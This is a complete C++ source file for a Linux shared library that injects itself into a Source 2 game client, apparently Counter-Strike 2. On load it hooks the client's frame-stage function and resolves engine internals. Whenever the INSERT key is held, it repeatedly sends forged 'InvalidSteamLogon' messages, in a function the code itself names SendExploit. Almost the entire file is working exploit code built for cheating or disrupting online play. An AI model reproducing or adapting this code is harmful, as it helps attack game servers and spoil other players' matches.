#include <X11/Xlib.h>
#include <atomic>
#include <cstdint>
#include <cstring>
#include <dlfcn.h>
#include <link.h>
#include <pthread.h>
#include <unistd.h>

#include "scan.h"
#include "funchook.h"

using KVNewFn         = void *(*)(size_t);
using KVCtorFn        = void *(*)(void *, const char *, void *, bool);
using KVSetIntFn      = void (*)(void *, const char *, int);
using KVDtorFn        = void (*)(void *);
using DispatchFn      = void (*)(void *, void *);
using CreateInterfaceFn = void *(*)(const char *, int *);

static void          *g_client   = nullptr;
static KVNewFn        g_kvNew    = nullptr;
static KVCtorFn       g_kvCtor   = nullptr;
static KVSetIntFn     g_kvSetInt = nullptr;
static KVDtorFn       g_kvDtor   = nullptr;
static DispatchFn     g_dispatch = nullptr;
static void          *g_engine   = nullptr;
static funchook_t    *g_funchook = nullptr;

static const uintptr_t kDispatchVtOffset = 0x3B8;

using FSNFn = void (*)(void *, int);
static FSNFn g_origFSN = nullptr;

static std::atomic<bool> g_exploitOn{false};
static std::atomic<long> g_remaining{0};
static std::atomic<long> g_totalSends{0};

static void *GetEngine() {
    void *e2 = dlopen("libengine2.so", RTLD_NOLOAD | RTLD_NOW);
    if (!e2) return nullptr;
    auto ci = (CreateInterfaceFn)dlsym(e2, "CreateInterface");
    dlclose(e2);
    return ci ? ci("Source2EngineToClient001", nullptr) : nullptr;
}

static bool ResolveKV() {
    g_engine = GetEngine();
    if (!g_engine) return false;

    g_dispatch = *(DispatchFn *)(*(char **)g_engine + kDispatchVtOffset);

    void *t0 = dlopen("libtier0.so", RTLD_NOLOAD | RTLD_NOW);
    if (!t0) return false;

    g_kvNew    = (KVNewFn)   dlsym(t0, "_ZN9KeyValuesnwEm");
    g_kvCtor   = (KVCtorFn)  dlsym(t0, "_ZN9KeyValuesC1EPKcP16IKeyValuesSystemb");
    g_kvSetInt = (KVSetIntFn)dlsym(t0, "_ZN9KeyValues6SetIntEPKci");
    g_kvDtor   = (KVDtorFn)  dlsym(t0, "_ZN9KeyValuesD1Ev");
    dlclose(t0);

    return g_kvNew && g_kvCtor && g_kvSetInt && g_kvDtor;
}

static void SendExploit(int reason) {
    if (!g_engine || !g_dispatch || !g_kvNew || !g_kvCtor || !g_kvSetInt || !g_kvDtor)
        return;
    void *kv = g_kvNew(0x1C);
    if (!kv) return;
    g_kvCtor(kv, "InvalidSteamLogon", nullptr, false);
    g_kvSetInt(kv, "reason", reason);
    g_dispatch(g_engine, kv);
    g_totalSends.fetch_add(1, std::memory_order_relaxed);
    g_kvDtor(kv);
}

static void HookFSN(void *inst, int stage) {
    g_origFSN(inst, stage);
    if ((stage == 5 || stage == 0) && g_exploitOn.load(std::memory_order_relaxed)) {
        long rem = g_remaining.load(std::memory_order_relaxed);
        if (rem > 0) {
            for (long i = 0; i < rem; ++i)
                SendExploit(13);
            g_remaining.store(0, std::memory_order_relaxed);
        }
    }
}

static int FindClientCb(struct dl_phdr_info *info, size_t, void *data) {
    if (!info->dlpi_name || !*info->dlpi_name) return 0;
    const char *base = strrchr(info->dlpi_name, '/');
    base = base ? base + 1 : info->dlpi_name;
    if (strcmp(base, "libclient.so") != 0) return 0;
    *reinterpret_cast<void **>(data) = dlopen(info->dlpi_name, RTLD_NOLOAD | RTLD_NOW);
    return 1;
}

static void *WorkerThread(void *) {
    void *clientHandle = dlopen("libclient.so", RTLD_NOLOAD | RTLD_NOW);
    if (!clientHandle)
        dl_iterate_phdr(FindClientCb, &clientHandle);
    if (!clientHandle) return nullptr;

    struct link_map *lm = nullptr;
    dlinfo(clientHandle, RTLD_DI_LINKMAP, &lm);
    void *clientBase = lm ? reinterpret_cast<void *>(lm->l_addr) : nullptr;
    dlclose(clientHandle);

    if (!clientBase) return nullptr;
    g_client = clientBase;

    if (!ResolveKV()) {
        while (true) usleep(10'000'000);
        return nullptr;
    }

    void *fsn = scan::Pattern(clientBase,
        "55 48 89 E5 41 56 41 55 41 54 49 89 FC 53 89 F3 48 83 EC 10 48 8B BF ? ? ? ? 48 85 FF");

    if (fsn) {
        g_funchook = funchook_create();
        g_origFSN = (FSNFn)fsn;
        if (funchook_prepare(g_funchook, (void **)&g_origFSN, (void *)HookFSN) != 0 ||
            funchook_install(g_funchook, 0) != 0) {
            funchook_destroy(g_funchook);
            g_funchook = nullptr;
        }
    }

    static const int  kTriggerKeycode = 118; // INSERT
    static const long kBurstSize      = 180;

    Display *dpy = XOpenDisplay(nullptr);
    bool wasHeld = false;

    while (true) {
        usleep(50'000);
        if (!dpy) continue;

        char keys[32];
        XQueryKeymap(dpy, keys);
        bool held = (keys[kTriggerKeycode / 8] >> (kTriggerKeycode % 8)) & 1;

        if (held) {
            g_exploitOn.store(true,      std::memory_order_relaxed);
            g_remaining.store(kBurstSize, std::memory_order_relaxed);
            if (!g_funchook)
                for (long i = 0; i < kBurstSize; ++i)
                    SendExploit(13);
        } else if (wasHeld) {
            g_exploitOn.store(false, std::memory_order_relaxed);
            g_remaining.store(0,     std::memory_order_relaxed);
        }
        wasHeld = held;
    }

    XCloseDisplay(dpy);
    return nullptr;
}

__attribute__((constructor)) static void Init() {
    pthread_t tid;
    pthread_create(&tid, nullptr, WorkerThread, nullptr);
    pthread_detach(tid);
}

__attribute__((destructor)) static void Fini() {
    if (g_funchook) {
        funchook_uninstall(g_funchook, 0);
        funchook_destroy(g_funchook);
        g_funchook = nullptr;
    }
}
